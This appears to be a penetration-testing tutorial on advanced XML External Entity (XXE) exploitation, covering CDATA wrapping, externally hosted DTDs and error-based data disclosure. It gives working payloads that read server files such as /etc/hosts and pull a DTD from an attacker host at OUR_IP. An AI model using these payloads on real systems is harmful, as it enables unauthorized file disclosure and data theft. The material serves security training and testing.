# Advanced File Disclosure

Not all XML External Entity (XXE) vulnerabilities are easy to exploit. Some file formats may not be directly readable through basic XXE techniques, and in certain cases, web applications may not output any input values. In these scenarios, we can attempt to force output through error messages.

**Advanced Exfiltration with CDATA**

To extract data from various web application backends, we can use CDATA sections. By wrapping the content of an external file reference in a CDATA tag (e.g., `<![CDATA[ FILE_CONTENT ]]>`), we can bypass XML parsing restrictions, allowing us to include special characters and binary data.

**Example Code:**

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

However, XML prevents joining internal and external entities directly. To overcome this, we can use XML Parameter Entities, which start with a `%` character and can be referenced externally.

**Revised Code:**

```xml
<!ENTITY joined "%begin;%file;%end;">
```

By hosting a DTD file (e.g., `xxe.dtd`) that contains this line and referencing it in the target web application, we can extract the desired file content.

**Advanced File Disclosure**

To implement this, we can create and host the DTD file:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Then, we reference the external entity in our XML request:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

This allows us to retrieve the content of `submitDetails.php` without encoding it, making the process more efficient.

**Error-Based XXE**

In cases where the web application does not output any XML or errors, we can exploit runtime errors to extract information. If the application displays PHP errors without proper exception handling, we can manipulate the XML input to trigger these errors.

**Example of Triggering an Error:**

```xml
<roo> <!-- Malformed tag -->
```

This can reveal directory structures that we can use for further exploitation.

**Payload for Error-Based Exfiltration:**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

By hosting this DTD and referencing it in our XML request, we can extract file content through error messages.

**Final Code Example:**

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

This method can also be adapted to read other files by changing the file path in the DTD script. However, it may be less reliable due to potential length limitations and special character issues.

#### Conclusion

These advanced techniques for exploiting XXE vulnerabilities can be powerful tools in a security professional's arsenal. Understanding how to manipulate XML parsing and error handling can lead to successful data exfiltration in scenarios where traditional methods fail. Always remember to test responsibly and ethically.
